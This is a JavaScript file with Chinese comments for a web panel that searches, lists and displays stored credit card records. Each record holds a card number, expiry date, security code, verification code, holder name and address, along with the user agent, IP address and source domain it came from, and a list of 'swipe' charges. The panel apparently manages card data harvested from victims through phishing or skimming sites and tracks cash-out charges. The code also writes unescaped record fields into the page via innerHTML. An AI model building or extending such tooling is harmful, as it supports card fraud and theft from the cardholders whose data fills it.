// ====== 搜索功能 ======
function showSearchResults(results, query) {
  let existingResults = document.getElementById('searchResults');
  if(existingResults) existingResults.remove();
  
  if(results.length === 0) {
    renderCardList(storeGet(LS_KEY));
    return;
  }
  
  const resultsContainer = document.createElement('div');
  resultsContainer.id = 'searchResults';
  resultsContainer.className = 'search-results';
  
  results.forEach((card, index) => {
    const resultItem = document.createElement('div');
    resultItem.className = 'search-result-item';
    
    let previewText = `${card.cardNo} - ${card.name} - ${card.bank}`;
    if(previewText.length > 60) {
      previewText = previewText.substring(0, 57) + '...';
    }
    
    resultItem.innerHTML = previewText;
    resultItem.onclick = function() {
      highlightCardRow(card.id);
      document.getElementById('searchResults').remove();
    };
    
    resultsContainer.appendChild(resultItem);
  });
  
  const searchInline = document.querySelector('.feishu-search-inline');
  searchInline.appendChild(resultsContainer);
}

// ====== 详情弹窗 ======
window.showCardDetail = function(id) {
  const cards = storeGet(LS_KEY);
  const c = cards.find(x=>x.id===id);
  if(!c) return;
  
  let html = `
    <div style="background:#fff;border-radius:18px;box-shadow:0 2px 16px #cfd8e37d;max-width:800px;margin:50px auto;padding:32px;position:relative;">
      <div style="font-size:1.22rem;font-weight:700;color:#256efa;margin-bottom:15px;text-align:center;">卡片详情</div>
      
      <div class="card-section-container">
        <div class="card-section">
          <div class="card-section-title">信用卡信息</div>
          <div class="card-detail-row"><span class="card-detail-label">卡号：</span><span class="card-detail-value">${c.cardNo||'-'}</span></div>
          <div class="card-detail-row"><span class="card-detail-label">日期：</span><span class="card-detail-value">${c.date||'-'}</span></div>
          <div class="card-detail-row"><span class="card-detail-label">安全码：</span><span class="card-detail-value">${c.securityCode||'-'}</span></div>
          <div class="card-detail-row"><span class="card-detail-label">验证码：</span><span class="card-detail-value">${c.verificationCode||'-'}</span></div>
        </div>
        
        <div class="card-section">
          <div class="card-section-title">资料信息</div>
          <div class="card-detail-row"><span class="card-detail-label">姓名：</span><span class="card-detail-value">${c.name||'-'}</span></div>
          <div class="card-detail-row"><span class="card-detail-label">地址：</span><span class="card-detail-value">${c.address||'-'}</span></div>
          <div class="card-detail-row"><span class="card-detail-label">城市：</span><span class="card-detail-value">${c.city||'-'}</span></div>
          <div class="card-detail-row"><span class="card-detail-label">州：</span><span class="card-detail-value">${c.state||'-'}</span></div>
        </div>
      </div>
      
      <div class="card-section-container">
        <div class="card-section">
          <div class="card-section-title">信用卡银行</div>
          <div class="card-detail-row"><span class="card-detail-label">类型：</span><span class="card-detail-value">${c.cardType||'-'}</span></div>
          <div class="card-detail-row"><span class="card-detail-label">级别：</span><span class="card-detail-value">${c.cardLevel||'-'}</span></div>
          <div class="card-detail-row"><span class="card-detail-label">国家：</span><span class="card-detail-value">${c.country||'-'}</span></div>
          <div class="card-detail-row"><span class="card-detail-label">银行：</span><span class="card-detail-value">${c.issuingBank||'-'}</span></div>
        </div>
        
        <div class="card-section">
          <div class="card-section-title">其他</div>
          <div class="card-detail-row"><span class="card-detail-label">UA：</span><span class="card-detail-value">${c.userAgent||'-'}</span></div>
          <div class="card-detail-row"><span class="card-detail-label">IP：</span><span class="card-detail-value">${c.ip||'-'}</span></div>
          <div class="card-detail-row"><span class="card-detail-label">域名：</span><span class="card-detail-value">${c.domain||'-'}</span></div>
          <div class="card-detail-row"><span class="card-detail-label">时间：</span><span class="card-detail-value">${c.time||'-'}</span></div>
        </div>
      </div>
      
      <button class="close-btn" onclick="closeCardDetail()">×</button>
    </div>
  `;
  
  let mask = document.createElement('div');
  mask.id = 'cardDetailMask';
  mask.style.cssText = "position:fixed;left:0;top:0;right:0;bottom:0;background:rgba(18,20,33,.17);z-index:2999;overflow-y:auto;padding:20px 0;";
  mask.innerHTML = html;
  document.body.appendChild(mask);
  
  window.closeCardDetail = function() {
    let m = document.getElementById('cardDetailMask');
    if(m) document.body.removeChild(m);
  };
}

// ====== 列表渲染 ======
function renderCardList(cards) {
  const container = document.getElementById('card-list');
  if(!cards.length) {
    container.innerHTML = `<div style="color:#bbb;font-size:1.01rem;padding:14px;">暂无卡片数据</div>`;
    return;
  }
  container.innerHTML = cards.map((c,i) => `
    <div class="feishu-list-row" data-card-id="${c.id}">
      <div class="td"><span class="feishu-index-badge">${i+1}</span></div>
      <div class="td">${c.cardNo||''}</div>
      <div class="td">${c.name||''}</div>
      <div class="td">${c.bank||''}</div>
      <div class="td">${c.swipe?c.swipe.length:0}</div>
      <div class="td">${c.swipe && c.swipe.length ? c.swipe.map(s=>s.amount||'-').join(' / ') : '-'}</div>
      <div class="td">${c.swipe && c.swipe.length ? c.swipe.map(s=>s.memo||'-').join(' / ') : '-'}</div>
      <div class="td">${c.swipe && c.swipe.length ? c.swipe.map(s=>s.date||'-').join(' / ') : '-'}</div>
      <div class="td td-op feishu-row-actions">
        <button onclick="showCardDetail('${c.id}')">详情</button>
        <button onclick="editCardDetail('${c.id}')">编辑</button>
      </div>
    </div>
  `).join('');
}
